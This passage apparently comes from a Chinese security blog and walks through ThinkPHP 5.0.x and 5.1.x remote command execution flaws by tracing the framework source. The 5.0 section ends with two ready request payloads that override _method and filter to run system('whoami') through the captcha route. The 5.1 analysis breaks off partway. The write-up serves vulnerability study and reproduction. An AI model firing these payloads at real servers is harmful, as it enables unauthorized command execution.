<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$path</span>   = <span class="variable">$request</span>-&gt;path();</span><br><span class="line">        <span class="variable">$depr</span>   = <span class="variable">$config</span>[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测</span></span><br><span class="line">        <span class="variable">$check</span> = !is_null(<span class="built_in">self</span>::<span class="variable">$routeCheck</span>) ? <span class="built_in">self</span>::<span class="variable">$routeCheck</span> : <span class="variable">$config</span>[<span class="string">&#x27;url_route_on&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="variable">$result</span> = Route::check(<span class="variable">$request</span>, <span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>跟进check,在获取method时调用了method方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$url</span>, <span class="variable">$depr</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$checkDomain</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//检查解析缓存</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="variable">$method</span> = strtolower(<span class="variable">$request</span>-&gt;method());</span><br><span class="line">        <span class="comment">// 获取当前请求类型的路由规则</span></span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p>
<p>跟进exec瞧一瞧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$dispatch</span>, <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;redirect&#x27;</span>: <span class="comment">// 重定向跳转</span></span><br><span class="line">                <span class="variable">$data</span> = Response::create(<span class="variable">$dispatch</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;redirect&#x27;</span>)</span><br><span class="line">                    -&gt;code(<span class="variable">$dispatch</span>[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// 模块/控制器/操作</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::module(</span><br><span class="line">                    <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],</span><br><span class="line">                    <span class="variable">$config</span>,</span><br><span class="line">                    <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;controller&#x27;</span>: <span class="comment">// 执行控制器操作</span></span><br><span class="line">                <span class="variable">$vars</span> = array_merge(Request::instance()-&gt;param(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">                <span class="variable">$data</span> = Loader::action(</span><br><span class="line">                    <span class="variable">$dispatch</span>[<span class="string">&#x27;controller&#x27;</span>],</span><br><span class="line">                    <span class="variable">$vars</span>,</span><br><span class="line">                    <span class="variable">$config</span>[<span class="string">&#x27;url_controller_layer&#x27;</span>],</span><br><span class="line">                    <span class="variable">$config</span>[<span class="string">&#x27;controller_suffix&#x27;</span>]</span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;method&#x27;</span>: <span class="comment">// 回调方法</span></span><br><span class="line">                <span class="variable">$vars</span> = array_merge(Request::instance()-&gt;param(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::invokeMethod(<span class="variable">$dispatch</span>[<span class="string">&#x27;method&#x27;</span>], <span class="variable">$vars</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: <span class="comment">// 闭包</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::invokeFunction(<span class="variable">$dispatch</span>[<span class="string">&#x27;function&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;response&#x27;</span>: <span class="comment">// Response 实例</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$dispatch</span>[<span class="string">&#x27;response&#x27;</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;dispatch type not support&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39; </code>时会调用<code>Request::instance()-&gt;param()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">			...</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p>
<p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p>
<p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p>
<p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39; </code>的问题了</p>
<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p>
<p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p>
<blockquote>
<p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p>
</blockquote>
<p>于是最后的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>

<h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p>
<p>我们看到<code>Request::param</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">			...</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>注意这一个<code>$this-&gt;method(true);</code></p>
<p><code>Request::method</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$method</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$method</span>) &#123;</span><br><span class="line">           <span class="comment">// 获取原始请求类型</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">       &#125; </span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;server)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = <span class="variable">$_SERVER</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server = array_merge(<span class="keyword">$this</span>-&gt;server, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;server, <span class="literal">false</span> === <span class="variable">$name</span> ? <span class="literal">false</span> : strtoupper(<span class="variable">$name</span>), <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 解析name</span></span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$type</span> = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 按.拆分成多维数组进行判断</span></span><br><span class="line">            <span class="keyword">foreach</span> (explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                    <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_object(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>于是有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/public/index.php?s=captcha</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="%5Bhttps://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%5D(https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3845#toc-2">https://xz.aliyun.com/t/3845#toc-2</a> </p>
<p> <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/01/29/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cku8k8fx6002dd0ob83ub535f" data-title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/29/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-01-29T16:00:00.000Z" itemprop="datePublished">2020-01-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/29/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
<p>测试环境 5.1.29</p>
<p><strong>入口处关闭报错</strong> </p>
<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
<p>我们从<code>Request::param</code>处开始分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;post(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;put(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;post)) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;post = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>) ? <span class="variable">$_POST</span> : <span class="keyword">$this</span>-&gt;getInputData(<span class="keyword">$this</span>-&gt;input);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
<p>跟进<code>Request::input</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            reset(<span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
<p>跟进去</p>
